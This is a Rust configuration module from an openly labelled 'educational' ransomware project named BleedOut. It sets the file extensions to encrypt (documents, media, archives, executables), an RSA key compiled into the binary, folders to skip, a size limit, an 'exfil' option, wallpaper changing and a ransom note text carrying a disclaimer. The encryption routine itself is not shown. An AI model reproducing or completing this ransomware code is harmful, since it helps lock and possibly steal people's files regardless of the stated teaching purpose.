use glob::{MatchOptions, Pattern};
use std::path::{Path, PathBuf};

pub const DEFAULT_RANSOM_EXT: &str = "m3str3";

/// Built-in RSA public key, compiled into the binary.
/// Used when `--public-key` is not provided.
pub const DEFAULT_PUBLIC_KEY_PEM: &str = include_str!("../keys/public_key.pem");

/// Built-in list of extensions the locker will encrypt by default.
pub fn default_valid_extensions() -> Vec<String> {
    [
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".jpg", ".jpeg", ".png",
        ".gif", ".bmp", ".tiff", ".psd", ".ai", ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg",
        ".midi", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".webm", ".mpg", ".m4v", ".zip",
        ".rar", ".7z", ".gz", ".tar", ".iso", ".dmg", ".apk", ".exe", ".msi", ".bin", ".bat",
        ".sh", ".js", ".html", ".css", ".php", ".sql", ".ico", ".svg", ".webp",
    ]
    .iter()
    .map(|s| (*s).to_string())
    .collect()
}

/// Resolve a path: absolute stays as-is; relative is joined to the user's home.
pub fn resolve_path(p: &Path) -> PathBuf {
    if p.is_absolute() {
        p.to_path_buf()
    } else {
        dirs::home_dir()
            .unwrap_or_else(|| PathBuf::from("."))
            .join(p)
    }
}

#[derive(Debug, Clone)]
pub struct LockConfig {
    pub target_dirs: Vec<PathBuf>,
    pub ransom_ext: String,
    pub valid_extensions: Vec<String>,
    pub exclude_globs: Vec<Pattern>, // <-- nuevo
    pub max_size: Option<u64>,       // <-- nuevo
    pub exfil: Option<String>,
    pub change_wallpaper: bool,
    pub note_dir: PathBuf,
    pub public_key_pem: String,
}

#[derive(Debug, Clone)]
pub struct UnlockConfig {
    pub target_dirs: Vec<PathBuf>,
    pub ransom_ext: String,
    pub aes_key_blob_b64: String,
    pub private_key_pem: String,
}

/// Glob patterns skipped by default. Case-insensitive on Windows.
/// Disable the whole set with `--no-exclude-defaults`.
pub const DEFAULT_EXCLUDES: &[&str] = &[
    "$RECYCLE.BIN",
    "System Volume Information",
    ".git",
    ".svn",
    "node_modules",
    "target",
    "Thumbs.db",
    "desktop.ini",
    "*.tmp",
    "*.temp",
    "*.log",
    "*.lock",
    "*.lnk",
    "*.crdownload",
    "*.part",
];

pub const RANSOM_NOTE: &str = "\
######################################################################
##                                                                  ##
##                            BLEEDOUT                              ##
##                                                                  ##
######################################################################

// ======================= ! DISCLAIMER ! ======================

This ransomware has been developed strictly for educational purposes and I,
Ignacio Jose Mestre Villagrasa, disclaim any responsibility for uses beyond
learning and experimentation. Seriously, don't get any funny ideas!

// ======================= ! REFERENCES ! ======================

Author: Ignacio Jose Mestre Villagrasa
GitHub: https://github.com/M3str3
Repository: https://github.com/M3str3/BleedOut

// ======================= ! FEATURES ! ======================

Welcome to BleedOut, a simple piece of ransomware.

Before you get too excited, remember:
- This is NOT intended for evil mastermind plans. If you're looking to start
  your career in villainy, you're in the wrong place.
- This ransomware encrypts files using AES, but you need the private key(RSA) 
  to decrypt them aswell with the AES key.
- No actual ransom is involved. Your files are safe, and no bitcoins will
  be harmed in the process of this educational endeavor.


Lastly, if this ransomware encrypts your homework, don't blame me.

Stay ethical.

Ignacio,

/// ======================= ! KEY ! ======================
AES key, you need to save this key to decrypt your files.
KEY = %KEY%
";

pub const DEFAULT_MAX_SIZE: u64 = 100 * 1024 * 1024; // 100 MiB

pub fn default_match_options() -> MatchOptions {
    MatchOptions {
        case_sensitive: false,
        require_literal_separator: false,
        require_literal_leading_dot: false,
    }
}

/// Parse a human-readable size like `100MB`, `1GB`, `500KB`, `1024`, or `0`.
/// `0` means "no limit".
pub fn parse_size(s: &str) -> Result<u64, String> {
    let s = s.trim();
    if s.is_empty() {
        return Err("empty size".into());
    }

    let idx = s.find(|c: char| !c.is_ascii_digit()).unwrap_or(s.len());
    let (num_str, suffix) = s.split_at(idx);

    let num: u64 = num_str
        .parse()
        .map_err(|_| format!("invalid number: {num_str:?}"))?;

    let mult: u64 = match suffix.trim().to_ascii_uppercase().as_str() {
        "" | "B" => 1,
        "K" | "KB" | "KIB" => 1024,
        "M" | "MB" | "MIB" => 1024 * 1024,
        "G" | "GB" | "GIB" => 1024 * 1024 * 1024,
        "T" | "TB" | "TIB" => 1024u64.pow(4),
        other => return Err(format!("unknown size suffix: {other:?}")),
    };

    num.checked_mul(mult)
        .ok_or_else(|| "size overflow".to_string())
}

/// Build the final list of patterns from defaults + user-supplied ones.
pub fn build_exclude_patterns(
    user_patterns: &[String],
    include_defaults: bool,
) -> Result<Vec<Pattern>, String> {
    let mut out = Vec::new();

    if include_defaults {
        for d in DEFAULT_EXCLUDES {
            out.push(Pattern::new(d).expect("built-in pattern is valid"));
        }
    }

    for p in user_patterns {
        let pat = Pattern::new(p).map_err(|e| format!("Invalid --exclude {p:?}: {e}"))?;
        out.push(pat);
    }

    Ok(out)
}

/// Case-insensitive glob match helper.
pub fn matches_any(patterns: &[Pattern], name: &str) -> bool {
    let opts = default_match_options();
    patterns.iter().any(|p| p.matches_with(name, opts))
}
